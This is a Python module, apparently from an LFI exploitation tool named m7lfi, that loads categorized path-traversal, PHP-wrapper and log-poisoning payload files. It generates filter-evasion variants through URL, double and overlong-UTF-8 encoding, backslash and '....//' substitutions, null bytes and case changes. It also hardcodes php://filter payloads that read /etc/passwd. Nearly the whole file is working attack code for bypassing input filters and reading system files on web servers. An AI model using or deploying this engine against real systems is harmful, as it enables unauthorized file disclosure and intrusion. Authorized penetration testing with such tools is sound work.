"""
m7lfi - Payload Engine
Milkyway Intelligence | Author: Sharlix
Loads payload files and generates mutations dynamically.
"""

import os
from typing import List, Dict


# ─── Payload categories mapped to files ───────────────────────────────────────
PAYLOAD_FILES = {
    "traversal":  "traversal.txt",
    "encoding":   "encoding.txt",
    "wrappers":   "wrappers.txt",
    "log_poison": "log_poison.txt",
    "windows":    "windows.txt",
    "linux":      "linux.txt",
    "framework":  "framework.txt",
}


class PayloadEngine:
    """
    Loads payloads from categorized text files and generates mutations.
    """

    def __init__(self, payloads_dir: str):
        self.payloads_dir = payloads_dir
        self._cache: Dict[str, List[str]] = {}

    # ── Loader ────────────────────────────────────────────────────────────────

    def load_category(self, category: str) -> List[str]:
        """Load payloads for a specific category."""
        if category in self._cache:
            return self._cache[category]

        filename = PAYLOAD_FILES.get(category)
        if not filename:
            return []

        path = os.path.join(self.payloads_dir, filename)
        if not os.path.exists(path):
            return []

        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]

        self._cache[category] = payloads
        return payloads

    def load_all(self) -> List[str]:
        """Load ALL payloads from all categories (deduplicated)."""
        all_payloads = []
        for category in PAYLOAD_FILES:
            all_payloads.extend(self.load_category(category))
        return list(dict.fromkeys(all_payloads))  # preserve order, deduplicate

    def load_categories(self, categories: List[str]) -> List[str]:
        """Load payloads from selected categories."""
        payloads = []
        for cat in categories:
            payloads.extend(self.load_category(cat))
        return list(dict.fromkeys(payloads))

    # ── Mutation Engine ───────────────────────────────────────────────────────

    def mutate(self, payload: str) -> List[str]:
        """
        Generate multiple bypass variants of a payload.
        Returns a list of mutated payloads.
        """
        variants = set()

        # 1. URL encode the slashes
        variants.add(payload.replace("../", "..%2f"))
        variants.add(payload.replace("../", "..%2F"))

        # 2. Double URL encode
        variants.add(payload.replace("../", "..%252f"))
        variants.add(payload.replace("../", "..%252F"))

        # 3. Unicode encode
        variants.add(payload.replace("../", "..%c0%af"))
        variants.add(payload.replace("../", "..%c1%9c"))

        # 4. Backslash (Windows bypass)
        variants.add(payload.replace("/", "\\"))
        variants.add(payload.replace("../", "..\\"))

        # 5. Double slash
        variants.add(payload.replace("../", "....//"))
        variants.add(payload.replace("../", "..././"))

        # 6. Null byte (older PHP)
        variants.add(payload + "%00")
        variants.add(payload + "\x00")

        # 7. Case mutation on letters
        variants.add(payload.upper())

        # 8. Junk insertion (between path components)
        parts = payload.split("/")
        if len(parts) > 2:
            junk_payload = "/".join(
                p + "." if i < len(parts) - 1 and p == ".." else p
                for i, p in enumerate(parts)
            )
            variants.add(junk_payload)

        # 9. php://filter base64 encode variant
        if "etc/passwd" in payload:
            variants.add("php://filter/convert.base64-encode/resource=/etc/passwd")
            variants.add("php://filter/read=string.rot13/resource=/etc/passwd")

        # Remove original from variants
        variants.discard(payload)

        return list(variants)

    def get_wrappers(self) -> List[str]:
        """Return PHP/data stream wrapper payloads."""
        return self.load_category("wrappers")

    def get_os_payloads(self, os_type: str = "linux") -> List[str]:
        """Return OS-specific payloads."""
        if os_type.lower() in ("win", "windows"):
            return self.load_category("windows")
        return self.load_category("linux")
